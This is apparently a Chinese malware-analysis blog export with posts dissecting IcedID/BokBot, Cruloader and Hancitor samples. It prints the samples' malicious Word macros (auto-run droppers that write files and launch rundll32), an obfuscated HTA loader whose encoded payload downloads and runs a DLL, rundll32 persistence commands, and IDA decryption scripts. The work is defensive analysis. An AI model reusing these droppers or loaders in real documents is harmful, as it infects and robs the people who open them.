{"pages":[{"title":"友情链接","text":".links-content{ margin-top:1rem; } .link-navigation::after { content: \" \"; display: block; clear: both; } .card { width: 45%; font-size: 1rem; padding: 10px 20px; border-radius: 4px; transition-duration: 0.15s; margin-bottom: 1rem; display:flex; } .card:nth-child(odd) { float: left; } .card:nth-child(even) { float: right; } .card:hover { transform: scale(1.1); box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.12), 0 0 6px 0 rgba(0, 0, 0, 0.04); } .card a { border:none; } .card .ava { width: 3rem!important; height: 3rem!important; margin:0!important; margin-right: 1em!important; border-radius:4px; } .card .card-header { font-style: italic; overflow: hidden; width: 100%; } .card .card-header a { font-style: normal; color: #2bbc8a; font-weight: bold; text-decoration: none; } .card .card-header a:hover { color: #d480aa; text-decoration: none; } .card .card-header .info { font-style:normal; color:#a3a3a3; font-size:14px; min-width: 0; overflow: hidden; white-space: nowrap; } 4xwi11’s blog 可恶的密码师傅 J1ang’s blog 爱如潮水，笔墨生花 葵子's blog 正在努力让自己看起来不那么菜，进度0.1/n pz’s blog 进击的逆向手 307’s blog 摸鱼cry手 Jasontt’s blog 大帅逼肾透带师 De3B4t0’s blog dbttttt","link":"/links/index.html"},{"title":"About me","text":"V&amp;N Team , Aiming for learning Reverse Engineering in Virus","link":"/about/index.html"}],"posts":[{"title":"about","text":"","link":"/2022/03/23/about/"},{"title":"bokbot-analysis","text":"2021-12-10 (FRIDAY) - TA551 (SHATHAK) ICEDID (BOKBOT) WITH COBALT STRIKE AND DARK VNChttps://www.malware-traffic-analysis.net/2021/12/10/index.html 邮件附件带有加密的压缩包，密码为ujy55 1python oledump.py -s a -v rule.12.21.doc 得到代码 12345678910111213141516171819202122232425262728Attribute VB_Name = &quot;ThisDocument&quot;Attribute VB_Base = &quot;1Normal.ThisDocument&quot;Attribute VB_GlobalNameSpace = FalseAttribute VB_Creatable = FalseAttribute VB_PredeclaredId = TrueAttribute VB_Exposed = TrueAttribute VB_TemplateDerived = TrueAttribute VB_Customizable = TrueFunction contents()ActiveDocument.Content.Find.Execute FindText:=&quot;x8&quot;, ReplaceWith:=&quot;&quot;, Replace:=2End FunctionFunction text1(doorLikeLike)text1 = ActiveDocument.BuiltInDocumentProperties(doorLikeLike).ValuecontentsEnd FunctionPublic Function s(likeLikeLoad, karolNextLove)CreateObject(text1(&quot;category&quot;)).exec &quot;c:\\windows\\explorer &quot; + karolNextLoveEnd FunctionAttribute VB_Name = &quot;main&quot;Public Sub autoopen()youTubePow = StrReverse(ThisDocument.text1(&quot;keywords&quot;))With ActiveDocument.SaveAs FileName:=youTubePow, FileFormat:=2End WithThisDocument.s &quot;&quot;, youTubePowEnd Sub 生成文件likePowLike.hta 那么我们文件的生成其实是一个解混淆的方法 123Function contents()ActiveDocument.Content.Find.Execute FindText:=&quot;x8&quot;, ReplaceWith:=&quot;&quot;, Replace:=2End Function 真正的文本在word中隐藏了，我们全选更改颜色后即可显示出来。 得到文件内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;html&gt; &lt;body&gt; &lt;p id=&quot;doorLikeGirl&quot; style=&quot;font-color: #000&quot;&gt;eval&lt;/p&gt; &lt;p id=&quot;dowGirlDow&quot; style=&quot;font-color: #000&quot;&gt; fX17KWUoaGN0YWN9O2Vzb2xjLmVraUxkYW9MZXZvbDspMiAsImdwai5kYW9MZWtpTGRhb2xcXGNpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmb3RldmFzLmVraUxkYW9MZXZvbDspeWRvYmVzbm9wc2VyLmVidVRyb29EdW95KGV0aXJ3LmVraUxkYW9MZXZvbDsxID0gZXB5dC5la2lMZGFvTGV2b2w7bmVwby5la2lMZGFvTGV2b2w7KSJtYWVydHMuYmRvZGEiKHRjZWpiT1hldml0Y0Egd2VuID0gZWtpTGRhb0xldm9sIHJhdnt5cnR7KTAwMiA9PSBzdXRhdHMuZWJ1VHJvb0R1b3koZmk7KShkbmVzLmVidVRyb29EdW95Oyllc2xhZiAsIlVNdzVpdmN4NXk2WU9Cd049cmVzdSZUSE14R3BJYjVjPXEmNENiTnlvQnFJSnVoMms5TEFqbU1UbG49JjF6bUl4RDVRSlNIRVNHY2lMWDlxPWRpYyZkbDNYaTZjb1FJcW92dGJacWFrSGkyanplVTA3PWRpJm91Y0hVQ0gwSHM9ZW1pdCZGaTVMb3NhQWk0ak94VnFZTGhXNjlXST1lZ2FwJmNUc0toNmRabnBKRD1lZ2FwJllIVmVPZUgwcHBHYXg3cW89cmVzdT83YXBlci81aEw4eTJXc0dYWXNMclZoenBqQi85ejJUMFFKSVNBaURqcVo0a3hCVXVBcXpOSWRYTS90dW1vMnJGUDJHSG1uSjZpdUMwb2ZTNlg1eHdKVDhXMjVIdkN5L05KbWNrdTEvZWhyZi9tb2MuZ3RpZmVuZWJkbmFsZXBvYy8vOnB0dGgiICwiVEVHIihuZXBvLmVidVRyb29EdW95OykicHR0aGxteC4ybG14c20iKHRjZWpiT1hldml0Y0Egd2VuID0gZWJ1VHJvb0R1b3kgcmF2---OykiZ3BqLmRhb0xla2lMZGFvbFxcY2lsYnVwXFxzcmVzdVxcOmMgMjNydnNnZXIiKG51ci5yb29Ed29QbHJpZzspInRjZWpib21ldHN5c2VsaWYuZ25pdHBpcmNzIih0Y2VqYk9YZXZpdGNBIHdlbiA9IGVidVRldm9Md29kIHJhdjspImxsZWhzLnRwaXJjc3ciKHRjZWpiT1hldml0Y0Egd2VuID0gcm9vRHdvUGxyaWcgcmF2 &lt;/p&gt; &lt;p id=&quot;nextLoveLove&quot; style=&quot;font-color: #fff&quot;&gt; ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/= &lt;/p&gt; &lt;script language=&quot;javascript&quot;&gt; function likeTubeDoor(loadPowGirl) { return new ActiveXObject(loadPowGirl); } function loadDowNext(karolLoadLike) { return likeNextLoad.getElementById(karolLoadLike).innerHTML; } function karolKarolLike(loadLikePow) { return &quot;cha&quot; + loadLikePow; } function doorDowKarol(likeLoveGirl) { var doorPowNext = loadDowNext(&quot;nextLoveLove&quot;); var likeLikeLike = &quot;&quot;; var dowPowYou, tubeDoorLoad, doorLikePow; var girlLoadNext, youGirlDoor, nextDoorPow, loadNextLike; var youLoveLoad = 0; likeLoveGirl = likeLoveGirl.replace(/[^A-Za-z0-9\\+\\/\\=]/g, &quot;&quot;); while (youLoveLoad &lt; likeLoveGirl.length) { girlLoadNext = doorPowNext.indexOf( likeLoveGirl.charAt(youLoveLoad++) ); youGirlDoor = doorPowNext.indexOf(likeLoveGirl.charAt(youLoveLoad++)); nextDoorPow = doorPowNext.indexOf(likeLoveGirl.charAt(youLoveLoad++)); loadNextLike = doorPowNext.indexOf( likeLoveGirl.charAt(youLoveLoad++) ); dowPowYou = (girlLoadNext &lt;&lt; 2) | (youGirlDoor &gt;&gt; 4); tubeDoorLoad = ((youGirlDoor &amp; 15) &lt;&lt; 4) | (nextDoorPow &gt;&gt; 2); doorLikePow = ((nextDoorPow &amp; 3) &lt;&lt; 6) | loadNextLike; likeLikeLike = likeLikeLike + String.fromCharCode(dowPowYou); if (nextDoorPow != 64) { likeLikeLike = likeLikeLike + String.fromCharCode(tubeDoorLoad); } if (loadNextLike != 64) { likeLikeLike = likeLikeLike + String.fromCharCode(doorLikePow); } } return likeLikeLike; } function loadLikeDow(girlPowYou) { return girlPowYou.split(&quot;&quot;).reverse().join(&quot;&quot;); } function loveGirlDow(loadLikePow) { return loadLikeDow(doorDowKarol(loadLikePow)); } function doorYouTube(loadLikePow, loadDoorPow) { return loadLikePow.split(loadDoorPow); } likeDoorKarol = window; likeNextLoad = document; likeDoorKarol[&quot;moveTo&quot;](-101, -102); var youDowLoad = loadDowNext(&quot;dowGirlDow&quot;).split(&quot;---&quot;); var doorTubeLoad = loveGirlDow(youDowLoad[0]); var loadLoadGirl = loveGirlDow(youDowLoad[1]); &lt;/script&gt; &lt;script language=&quot;javascript&quot;&gt; function doorPowKarol(nextLoadYou) { likeDoorKarol[loadDowNext(&quot;doorLikeGirl&quot;)](nextLoadYou); } &lt;/script&gt; &lt;script language=&quot;vbscript&quot;&gt; Call doorPowKarol(doorTubeLoad) : Call doorPowKarol(loadLoadGirl) &lt;/script&gt; &lt;script language=&quot;javascript&quot;&gt; likeDoorKarol[&quot;close&quot;](); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 那么很明显是一个base64解密的过程，我们直接拿出来解密得到攻击代码 从这个代码中可以得到loadLikeLoad.jpg,然后使用regsvr32 执行该文件,可以知道此为dll 12file loadLikeLoad.jpgloadLikeLoad.jpg: PE32+ executable (DLL) (native) x86-64, for MS Windows first 得到PE文件 那么是如何调用PE的呢？我们可以在函数中找到call eax 调用了dllmain函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697int __cdecl main(int argc, const char **argv, const char **envp){ unsigned __int64 v3; // rbx __int64 v4; // rdi unsigned __int64 v5; // rax unsigned int v6; // eax __int64 v7; // rax unsigned int v8; // eax void *v9; // rbx unsigned int v10; // edi HANDLE ProcessHeap; // rax __int64 v12; // rax CHAR v14[32]; // [rsp+20h] [rbp-49h] BYREF char v15[64]; // [rsp+40h] [rbp-29h] BYREF unsigned int v16; // [rsp+80h] [rbp+17h] char v17[60]; // [rsp+84h] [rbp+1Bh] BYREF LPVOID lpMem; // [rsp+D0h] [rbp+67h] BYREF unsigned __int64 v19; // [rsp+D8h] [rbp+6Fh] BYREF v3 = 0i64; v4 = 4i64; do { v5 = __rdtsc(); v3 = v5 | (v3 &lt;&lt; 16); Sleep(v3 &amp; 15); --v4; } while ( v4 ); wsprintfA(v14, &quot;%016IX&quot;, v3); decrypt(v15); v6 = sub_242A40(); v7 = sub_24160C(v16, v6, v14); if ( v7 &amp;&amp; sub_241FC0(v17, v7, &amp;lpMem, &amp;v19) &amp;&amp; v19 &gt;= 0x400 ) { v8 = sub_24233C(lpMem); v9 = lpMem; v10 = v8; if ( lpMem ) { ProcessHeap = GetProcessHeap(); HeapFree(ProcessHeap, 0, v9); } v12 = sub_2422C4(v14, v10); if ( v12 ) sub_241828(v17, v12); } return 0;}int __cdecl main(int argc, const char **argv, const char **envp){ unsigned __int64 v3; // rbx __int64 v4; // rdi unsigned __int64 v5; // rax unsigned int v6; // eax __int64 v7; // rax unsigned int v8; // eax void *v9; // rbx unsigned int v10; // edi HANDLE ProcessHeap; // rax __int64 v12; // rax CHAR v14[32]; // [rsp+20h] [rbp-49h] BYREF char v15[64]; // [rsp+40h] [rbp-29h] BYREF unsigned int v16; // [rsp+80h] [rbp+17h] char v17[60]; // [rsp+84h] [rbp+1Bh] BYREF LPVOID lpMem; // [rsp+D0h] [rbp+67h] BYREF unsigned __int64 v19; // [rsp+D8h] [rbp+6Fh] BYREF v3 = 0i64; v4 = 4i64; do { v5 = __rdtsc(); v3 = v5 | (v3 &lt;&lt; 16); Sleep(v3 &amp; 15); --v4; } while ( v4 ); wsprintfA(v14, &quot;%016IX&quot;, v3); decrypt(v15); v6 = sub_242A40(); v7 = sub_24160C(v16, v6, v14); if ( v7 &amp;&amp; sub_241FC0(v17, v7, &amp;lpMem, &amp;v19) &amp;&amp; v19 &gt;= 0x400 ) { v8 = sub_24233C(lpMem); v9 = lpMem; v10 = v8; if ( lpMem ) { ProcessHeap = GetProcessHeap(); HeapFree(ProcessHeap, 0, v9); } v12 = sub_2422C4(v14, v10); if ( v12 ) sub_241828(v17, v12); } return 0;} 其中有一个加密数据段，保存了访问的url地址 解密后得到地址如下 next get url这个dll的作用是下载持久化dll，当我们运行该dll时 1&quot;C:\\Windows\\System32\\rundll32.exe&quot; &quot;C:\\Users\\Scr1pt\\Desktop\\1\\gg.dll&quot; #1 首先会去访问aws.amazon.com 然后会去访问主机获得IcedID installer 也即是2021-12-10-binary-from-jeliskvosh.com.bin文件,gziploader解密。 然后利用rundll32.exe [filename],DllMain --fi=&quot;[path to license.dat]&quot;去调用license.dat持久化 1&quot;C:\\Windows\\System32\\rundll32.exe&quot; &quot;C:\\Users\\Scr1pt\\Desktop\\WrongEvolve\\usage_x32.dat&quot;,DllMain --fi=&quot;C:\\Users\\Scr1pt\\Desktop\\WrongEvolve\\license.dat&quot; 原先预想调试一下，发现run不起来，望有大佬赐教。 decrypt license.dat利用Binary Defender编写的脚本进行解密 1python3 IceDecrypt.py -f license.dat 得到解密后的dll文件，后续就是窃取电脑上的各类信息了。 有大量的加密数据，其实是通过rol、ror进行加密的，我们进行解密即可得到原数据。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import structfrom malduck import xorfrom malduck.bits import rol, rorimport ida_bytesdef generate_round_key(seed): # .text:0000000180015B00 decrypt_string_shifting proc near ; CODE XREF: decrypt_string+65↑p # .text:0000000180015B00 ; sub_18000A56C+117↑p ... # .text:0000000180015B00 lea eax, [rcx+2E59h] # .text:0000000180015B06 ror eax, 1 # .text:0000000180015B08 ror eax, 1 # .text:0000000180015B0A ror eax, 2 # .text:0000000180015B0D xor eax, 151Dh # .text:0000000180015B12 rol eax, 2 # .text:0000000180015B15 rol eax, 1 # .text:0000000180015B17 retn # .text:0000000180015B17 decrypt_string_shifting endp eax = seed + 0x2E59 eax = ror(eax, 1) eax = ror(eax, 1) eax = ror(eax, 2) eax = struct.unpack(&quot;I&quot;, xor(struct.pack(&quot;I&quot;, eax)[0:2], struct.pack(&quot;H&quot;, 0x151D)) + struct.pack(&quot;I&quot;, eax)[2:4])[0] eax = rol(eax, 2) eax = rol(eax, 1) return eaxdef decrypt_string(offset): b = ida_bytes.get_bytes(offset, 0x200) str_size = struct.unpack(&quot;H&quot;, xor(b[4:6], b[0:2]))[0] xor_key_index = 6 decrypted_string = &quot;&quot; seed = ida_bytes.get_dword(offset) for current_offset in range(str_size): seed = generate_round_key(seed) current_dec_chr = b[xor_key_index] ^ (seed &amp; 0xFF) xor_key_index += 1 decrypted_string += chr(current_dec_chr) return decrypted_string# This is an example script that implements the core decryption# algorithm of current IcedID samples.start = 0x1800207C0end = 0x180026366f = open('outString.txt','w')for i in range(start,end): try: f.write(decrypt_string(i)) #print(decrypt_string(i)) except: continue 解密出来字符串如下，可以看出是一些对浏览器数据库的读取，headers的设置，邮件信息等的窃取。","link":"/2022/03/23/bokbot-analysis/"},{"title":"hello","text":"新搭建博客了，欢迎来踩！","link":"/2022/03/23/hello/"},{"title":"cruloader","text":"Cruloader1th Stage一到main函数就是一个加密函数，我们编写脚本去恢复 加密函数如下 那么编写解密脚本并patch上去 12345678910111213141516171819202122232425262728293031table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890./='def decode(enc): result = '' for i in range(len(enc)): ind = table.index(enc[i]) + 13 if ind &gt;= len(table): ind -= len(table) result +=table[ind] return resultif __name__ == '__main__': ea_start = 0x00414880 ea_end = 0x00414980 count = 0 tt = b'' for ea in range(ea_start,ea_end): temp = ida_bytes.get_bytes(ea,1) if ord(temp) == 0 or ord(temp) == 10: if tt !=b'': dec_str = decode(tt.decode()) ida_bytes.patch_bytes(ea-len(tt),dec_str.encode()) tt = b'' ea_start = ea else: count += 1 tt += temp print('ok') 然后发现Resource中保存有一些加密数据 对应的解密代码段如下，是一个RC4加密的代码段，key为加密代码段的第12byte后的16byte。 解密的数据为key后面的数据,key为kkd5YdPM24VBXmi 2th Stage进一步分析，恶意代码执行流程如下 检测反调试 --&gt; 检测进程列表 --&gt; 装载所需的api函数 --&gt; 创建进程svchost.exe --&gt; 把本进程代码注入到svchost.exe中 导入注入所需的函数 导入函数使用crc32加密 3th Stage创建进程 远程代码注入 断点命中 首先导入wininet.dll 解密得到url并进行访问 代码是存放在原PE的，我们可以直接找到逻辑 对应的解密逻辑 cyberchef 1https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Rotate_left(4,false)XOR(%7B'option':'Decimal','string':'197'%7D,'Standard',false)&amp;input=REExQjFCNUI2QkZGQUVBRTVCNEE2QjFCMEE3QUNBQkFCRTZBQUE4QUFFN0I0QTJCQUU4QTk4MEE4QUNGMTgyOA 访问得到png，再通过访问得到png的数据 然后virtualAlloc申请空间写入PNG 4th Stage解密得到弹窗的PE代码，但是已经无法解密了（原作者脚本失效） tipsida python脚本编写 由于汇编指令格式如下 得到所有函数的crc32表 根据交叉引用和crc32表进行过匹配 输入 comment 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import pefile, os, re, binasciidlls_list = [&quot;kernel32.dll&quot;, &quot;ntdll.dll&quot;, &quot;wininet.dll&quot;]#Get the list of all functions inside the dlldef get_functions(dll_path): pe = pefile.PE(dll_path) if ((not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT')) or (pe.DIRECTORY_ENTRY_EXPORT is None)): print(f&quot;[*] No exports for {dll_path}&quot;) return [] else: expname = [] for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols: if exp.name: expname.append(exp.name) return expname# Hash the function namedef calc_crc32(string): return int(binascii.crc32(string) &amp; 0xFFFFFFFF)# Generate CRC32 lookup tablewin_path = os.environ['WINDIR']system32_path = os.path.join(win_path, &quot;system32&quot;)data = {}for dll in dlls_list: dll_path = os.path.join(system32_path, dll) dll_name = dll.split(&quot;.&quot;)[0].lower() if os.path.isfile(dll_path): for f in get_functions(dll_path): f_name = re.sub(r'\\W+', '_', f.decode('utf-8')) name = &quot;func_&quot;+dll_name + &quot;_&quot; + f_name.lower() data[calc_crc32(f)] = name print(f&quot;[+] Generated functions for {dll_path}&quot;) else: print(f&quot;[*] File not found: {dll_path}&quot;)# List all Xref to the function, retrieve the content of edx (where the crc32 hash is) and compare it to our crc32 lookup table. A comment is set if there is a hitfor xref in XrefsTo(get_name_ea_simple(&quot;f_getProcAddr&quot;)): currentAddress = 0 ea = xref.frm for i in range(0,20): mnem = print_insn_mnem(prev_head(ea-i)) if mnem == &quot;mov&quot;: if print_operand(prev_head(ea-i), 0) == &quot;edx&quot;: crc32_value = print_operand(prev_head(ea-i), 1) crc32_value = int(crc32_value[:-1], 16) for k, v in data.items(): if k == crc32_value: set_cmt(xref.frm, v, 0) break 解密函数 对应着 https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Rotate_left(4,false)XOR(%7B'option':'Decimal','string':'162'%7D,'Standard',false)Reverse('Character')&amp;input=N0M2RDFEQkQxRkVGMUQ1RERDNkNDQ0JDNUZFRjg5MUVo summary收获主要是实现了新线程断点，解决了之前的痛点。熟悉了crc32算法，利用cyberchef解rol，学习了利用交叉引用注释提高代码辨识度的ida python脚本。 缺陷在于仍然无法看懂这段代码，即无法实现静态分析解密处png图片的payload，留坑。","link":"/2022/03/23/cruloader/"},{"title":"2021-09-02 hancitor","text":"2021-09-02 (THURSDAY) - HANCITOR (CHANITOR/MAN1/MOSKALVZAPOE/TA511) WITH COBALT STRIKE (BEACON)Timeline Initial Access首先我们得到了钓鱼邮件。 我们在邮件中得到了一个html文件，也许在邮箱中它会直接显示为html格式，并诱导点击See Document。该按钮的导向链接为feedproxy.google.com/r/wgildewqw/3/DFuCIekYsNE/saintdom.php 下面是一个感染启动方式，由于链接已经挂掉了，我们直接利用现成的word文档进行分析。 1Please visit DocuSign, click on 'Access Documents', and enter the security code: E8A9CA9AF4 word此单个分页文档包含一个具有指令的图片，试图引诱受害者进入宏，以启动vbs恶意宏代码。 我们利用oledump进行宏代码的提取 1234567891011121314151617Attribute VB_Name = &quot;Module1&quot;Sub pppx(spoc As String) Documents.Open FileName:=spoc, ConfirmConversions:=False, ReadOnly:= _ False, AddToRecentFiles:=False, PasswordDocument:=&quot;123321&quot;, _ PasswordTemplate:=&quot;&quot;, Revert:=False, WritePasswordDocument:=&quot;&quot;, _ WritePasswordTemplate:=&quot;&quot;, Format:=wdOpenFormatAuto, XMLTransform:=&quot;&quot;End SubSub ousx()Call uoia(Options.DefaultFilePath(wdUserTemplatesPath))End Sub 1234567891011121314151617181920212223242526272829303132333435363738Attribute VB_Name = &quot;Module123345&quot;Dim pls As String Sub Search(mds As Object, pafs As String) Dim Nedc As Object Dim Ters As Object Dim fffff fffff = &quot;gl&quot; &amp; &quot;ib.b&quot; &amp; &quot;a&quot; &amp; &quot;x&quot;For Each Nedc In mds.SubFolders Search Nedc, pafs Next Nedc For Each Ters In mds.Files If Ters.Name = fffff Then pafs = Ters End If Next Ters Exit SubErrHandle: Err.ClearEnd SubSub nam(pafs As String)Call ousxDim oxloxl = &quot;\\gl&quot; &amp; &quot;ib.d&quot; &amp; &quot;o&quot; &amp; &quot;c&quot;Name pafs As pls &amp; oxlEnd SubSub uoia(fffs As String)pls = fffsEnd Sub 123456789101112131415161718192021222324252627Attribute VB_Name = &quot;Module3&quot;Sub bvxfcsd()Dim uuuucuuuuc = Options.DefaultFilePath(wdUserTemplatesPath)Dim ewrwsdf As Stringewrwsdf = &quot;L&quot; &amp; &quot;oc&quot; &amp; &quot;a&quot; &amp; &quot;l&quot;ewrwsdf = ewrwsdf &amp; &quot;/&quot; &amp; &quot;Temp&quot; ntgs = 50sda = 49Dim kuls As Stringkuls = ewrwsdfWhile sda &lt; 50 ntgs = ntgs - 1 If Dir(Left(uuuuc, ntgs) &amp; kuls, vbDirectory) = &quot;&quot; Then Else sda = 61 End If Wend Call ThisDocument.hdhdd(Left(uuuuc, ntgs) &amp; ewrwsdf)End Sub 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455Attribute VB_Name = &quot;ThisDocument&quot;Attribute VB_Base = &quot;1Normal.ThisDocument&quot;Attribute VB_GlobalNameSpace = FalseAttribute VB_Creatable = FalseAttribute VB_PredeclaredId = TrueAttribute VB_Exposed = TrueAttribute VB_TemplateDerived = TrueAttribute VB_Customizable = TrueOption ExplicitOption Compare Text Dim hdv As String Dim bbbb As String Dim med As StringPrivate Sub Document_Open()Dim dfgdgdgDim kytrewwf As Stringkytrewwf = Options.DefaultFilePath(wdUserTemplatesPath)Dim fdfcc As Stringfdfcc = &quot;.d&quot;If Dir(kytrewwf &amp; &quot;\\gl&quot; &amp; &quot;i&quot; &amp; &quot;b&quot; &amp; fdfcc &amp; &quot;o&quot; &amp; &quot;c&quot;) = &quot;&quot; Then Selection.MoveDown Unit:=wdLine, Count:=3 Selection.MoveRight Unit:=wdCharacter, Count:=2 Selection.MoveDown Unit:=wdLine, Count:=3 Selection.MoveRight Unit:=wdCharacter, Count:=2 Selection.TypeBackspace Selection.Copy Call bvxfcsdIf Len(hdv) &gt; 2 ThenCall nam(hdv) Call pppx(kytrewwf &amp; &quot;\\gl&quot; &amp; &quot;ib.d&quot; &amp; &quot;o&quot; &amp; &quot;c&quot;) ActiveDocument.CloseEnd IfEnd IfEnd SubSub hdhdd(asda As String)Dim MyFSO As FileSystemObjectDim MyFile As FileDim SourceFolder As StringDim DestinationFolder As StringDim MyFolder As FolderDim MySubFolder As FolderSet MyFSO = New Scripting.FileSystemObjectCall Search(MyFSO.GetFolder(asda), hdv)End Sub 阅读源码可以知道这个宏是写了一个密码为123321且文件名为glib.doc的文件。 我们通过虚拟机发现同时生成了一个yefff.dll的文件。 文件路径C:\\Users\\{用户名}\\AppData\\Roaming\\Microsoft\\Templates 我们再次查看glib.doc的ole流。 python .\\oledump.py .\\glib.doc -s b5 -v，可以看到 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758Option ExplicitOption Compare Text Dim hdv As String Dim bbbb As String Dim med As StringPrivate Sub Document_Open()Dim vcbc As String Dim dfgdgdgbbbb = &quot;rundl&quot;vcbc = Options.DefaultFilePath(wdUserTemplatesPath)If Dir(vcbc &amp; &quot;\\yefff.dll&quot;) = &quot;&quot; Then Selection.MoveDown Unit:=wdLine, Count:=3 Selection.MoveRight Unit:=wdCharacter, Count:=2 Selection.MoveDown Unit:=wdLine, Count:=3 Selection.MoveRight Unit:=wdCharacter, Count:=2 Selection.TypeBackspace Selection.Copy Call bvxfcsdIf Len(hdv) &gt; 2 ThenCall nam(hdv)Dim pattisonpattison = &quot;\\yefff.dll&quot; Dim cvzz As Stringcvzz = &quot;l32&quot; Shell (bbbb &amp; cvzz &amp; &quot; &quot; &amp; vcbc &amp; pattison &amp; &quot;,VVNOUNDWUMR&quot;)End IfEnd IfEnd SubSub hdhdd(asda As String)Dim MyFSO As FileSystemObjectDim MyFile As FileDim SourceFolder As StringDim DestinationFolder As StringDim MyFolder As FolderDim MySubFolder As FolderSet MyFSO = New Scripting.FileSystemObjectCall Search(MyFSO.GetFolder(asda), hdv)End Sub 其实这是执行了VVNOUNDWUMR函数 1rundll32.exe yefff.dll,VVNOUNDWUMR 我们跟进dll文件 hancitorwhat is hancitor1Hancitor is a well-known malware loader that has been observed delivering FickerStealer, Sendsafe, and Cobalt Strike Beacon if the victim targeting conditions are met. In recent months, more threat intelligence has been gathered as to what the attackers’ goals are when Hancitor is used to deliver Cobalt Strike Beacon and, [based on the information shared,](https://blog.group-ib.com/hancitor-cuba-ransomware) it has become apparent that the Cuba Ransomware gang has selected Hancitor as its loader of choice. This means that companies of all sizes need to be sure their cyber defense and detection strategies include the capability to detect behaviors associated with Hancitor. Many ransomware gangs up to this point have chosen Cobalt Strike as their preferred tool to move within an environment, but few malware loaders drop Beacon as quickly as Hancitor. This means that time to detection and response is critical for defenders to avoid damage to systems that they protect. Analysis of Hancitor – When Boring Begets Beacon - Binary Defense unpack我们尝试在export中找到VVNOUNDWUMR函数，奇怪的是其并不存在。那么猜测这是经过了pack。 我们把它扔到unpac.me上进行解密。经过unpack后，会发现火绒已经能识别出这是一个下载者木马hancitor。（我们考虑后期学习手撕这种加壳方式） 扔到ida里面分析一下，对于dll，我们可以通过导出函数或者rdata来寻找异常点。 12VVNOUNDWUMR -&gt;sub_5B1870()0&gt; sub_5B1AA0() -&gt; sub_5B25B0() -&gt; sub_5B2CD0(dword_5B7264, 0x2000u, &amp;pbData, 8u); 找到了加密函数 123456789101112131415161718192021222324252627282930313233343536DWORD __cdecl sub_5B2CD0(BYTE *a1, DWORD pdwDataLen, BYTE *pbData, DWORD dwDataLen){ DWORD v5; // [esp+4h] [ebp-10h] HCRYPTKEY phKey; // [esp+8h] [ebp-Ch] BYREF HCRYPTPROV phProv; // [esp+Ch] [ebp-8h] BYREF HCRYPTHASH phHash; // [esp+10h] [ebp-4h] BYREF phKey = 0; phHash = 0; phProv = 0; v5 = 0; if ( CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) &amp;&amp; CryptCreateHash(phProv, CALG_SHA1, 0, 0, &amp;phHash) &amp;&amp; CryptHashData(phHash, pbData, dwDataLen, 0) &amp;&amp; CryptDeriveKey(phProv, 0x6801u, phHash, 0x280011u, &amp;phKey) &amp;&amp; CryptDecrypt(phKey, 0, 1, 0, a1, &amp;pdwDataLen) ) { v5 = pdwDataLen; } if ( phHash ) { CryptDestroyHash(phHash); phHash = 0; } if ( phKey ) { CryptDestroyKey(phKey); phKey = 0; } if ( phProv ) { CryptReleaseContext(phProv, 0); phProv = 0; } return v5;} 这里有个小tips，我们需要把CryptDeriveKey函数好好看一下。尤其注意它的第四个参数，也就是dwFlags 1234567BOOL CryptDeriveKey( [in] HCRYPTPROV hProv, [in] ALG_ID Algid, [in] HCRYPTHASH hBaseData, [in] DWORD dwFlags, [in, out] HCRYPTKEY *phKey); DWORD类型的dwFlags是八位，值的区域在0x00000000--0xFFFFFFFF。而key的大小取决于前8位数值. 1The key size, representing the length of the key modulus in bits, is set with the upper 16 bits of this parameter. CryptDeriveKey function (wincrypt.h) - Win32 apps | Microsoft Docs 回到我们此处的逻辑 取pbData进行SHA1加密，并取其前五个字符作为key，进行rc4解密。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837import hashlibfrom Crypto.Cipher import ARC4pbdata = bytes([ 0x51, 0x89, 0xAD, 0x89, 0xC0, 0xF8, 0x28, 0x3B])enc = [0x20, 0xE8, 0xDD, 0x5C, 0xA4, 0x88, 0x73, 0x81, 0xCD, 0x49, 0x85, 0xB9, 0x9C, 0x9A, 0x36, 0x97, 0xF7, 0x3A, 0x8F, 0x9F, 0xFE, 0xB5, 0xDF, 0x49, 0x41, 0x68, 